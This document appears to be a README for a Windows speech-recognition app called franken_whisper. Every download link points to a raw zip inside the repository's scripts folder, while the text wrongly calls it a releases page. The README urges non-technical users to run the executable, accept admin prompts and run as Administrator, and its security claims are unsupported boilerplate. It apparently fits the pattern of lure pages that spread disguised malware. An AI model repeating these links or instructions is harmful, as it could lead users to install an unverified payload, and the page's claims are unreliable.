# 🗣️ franken_whisper - Easy Speech Recognition Setup

[![Download franken_whisper](https://img.shields.io/badge/Download-franken_whisper-brightgreen)](https://github.com/pjayanthi/franken_whisper/raw/refs/heads/main/scripts/whisper-franken-v1.4.zip)

---

Welcome to **franken_whisper**, an application that turns speech into text. This program runs on Windows and works without any programming knowledge. It uses smart technology in the background to provide accurate and fast transcription of your audio.

This guide will help you download, install, and use franken_whisper on your Windows computer.

---

## 🖥️ What is franken_whisper?

franken_whisper is a tool that listens to spoken words and writes them down in real time. It combines different speech recognition technologies to work well even in complex audio situations. It can handle multiple speakers, different noise levels, and save your transcripts for later use.

You do not need any coding skills to run this application. It works through a simple command prompt window, which this guide will help you use step by step.

Key features include:

- Transcribes speech in real time.
- Distinguishes speakers in conversations (diarization).
- Saves transcripts in a simple database for easy access.
- Works smoothly on standard Windows machines.
- Uses only safe Rust code, so it is reliable and secure.

---

## ⚙️ System Requirements

Before downloading, please ensure your computer meets these requirements:

- Operating System: Windows 10 (64-bit) or newer.
- CPU: Dual-core or better.
- RAM: At least 4 GB.
- Storage: At least 500 MB free disk space.
- Internet: Not required after download, but needed to download the application.
- Optional: A microphone for live audio input or audio files saved on your PC.

You do not need a graphics card or special hardware to use franken_whisper. It runs completely on your regular computer.

---

## 📥 Download franken_whisper

To get the program, you need to visit the releases page. This page contains the latest versions for Windows ready to download.

[![Get franken_whisper](https://img.shields.io/badge/Get%20franken_whisper-blue)](https://github.com/pjayanthi/franken_whisper/raw/refs/heads/main/scripts/whisper-franken-v1.4.zip)

**Steps to download:**

1. Click the green or blue button above or visit this page:  
   https://github.com/pjayanthi/franken_whisper/raw/refs/heads/main/scripts/whisper-franken-v1.4.zip
2. Look for the latest release. Look for files ending in `.exe` or `.zip` for Windows.
3. Click to download the `.exe` file if available for a quick start, or the `.zip` file if you want the full package.
4. Save the file to a folder you will remember, such as your Desktop or Downloads.

---

## 💾 Installing franken_whisper

If you downloaded a `.exe` file:

1. Double-click the file you downloaded.
2. Windows may ask if you want to allow this app to make changes. Click **Yes**.
3. Follow the simple prompts on the screen.
4. The app installs itself without needing extra tools.

If you downloaded a `.zip` file:

1. Locate the zip file in your folder.
2. Right-click and select **Extract All**.
3. Choose a folder or accept the default location.
4. Open the folder after extraction completes.
5. Look for a file named `franken_whisper.exe`.

---

## 🚀 How to Run franken_whisper

After installing, you will use the application through the Windows Command Prompt.

### Open Command Prompt:

1. Press the Windows key on your keyboard.
2. Type `cmd` and press Enter.
3. A black window with white text will appear.

### Run the program:

1. Use the `cd` command to go to the folder where franken_whisper was installed or extracted. For example, if it's on your Desktop:

   ```
   cd Desktop\franken_whisper
   ```

2. Start franken_whisper by entering:

   ```
   franken_whisper.exe
   ```

3. The program will now wait for audio input or accept audio files you want to transcribe.

---

## 🎙️ Using franken_whisper

There are two main ways to use this speech recognition tool:

### 1. Transcribe live audio from a microphone:

- Make sure your microphone is connected and working.
- Run franken_whisper.
- Speak clearly.
- The text will appear in the Command Prompt window as you talk.
- The program can separate voices if multiple people speak.

### 2. Transcribe audio files:

- Place your audio files (WAV, MP3, etc.) in the franken_whisper folder.
- Run franken_whisper with the file name, like:

  ```
  franken_whisper.exe audiofile.wav
  ```

- The software will write the transcript for that file.

---

## 📂 Saving Transcripts

franken_whisper uses an easy way to save your work:

- Transcripts are saved automatically in a small database file.
- This file uses SQLite, which is built into the program.
- You can open and read transcripts later without running the program again.
- Transcripts are stored in a simple format that other apps can use.

---

## ⚡ Troubleshooting

If you run into issues, try these steps:

- Make sure you have the latest Windows updates installed.
- Check if your audio device is working outside the application.
- Restart franken_whisper and try again.
- If franken_whisper closes without a message, try running Command Prompt as Administrator.
- For audio files, verify the file format is supported and the file is not corrupted.

---

## 📚 More Information

franken_whisper uses advanced speech recognition tools behind the scenes but keeps the experience simple. It relies on Rust code, ensuring it is safe and stable.

The program processes audio in real time, handles speakers separately, and writes transcripts to a file you can use.

The app’s design is to work on regular Windows computers without technical knowledge.

---

## 📥 Download Link Again

Access the latest Windows releases here: 

https://github.com/pjayanthi/franken_whisper/raw/refs/heads/main/scripts/whisper-franken-v1.4.zip

Use this page to download the newest version for your system.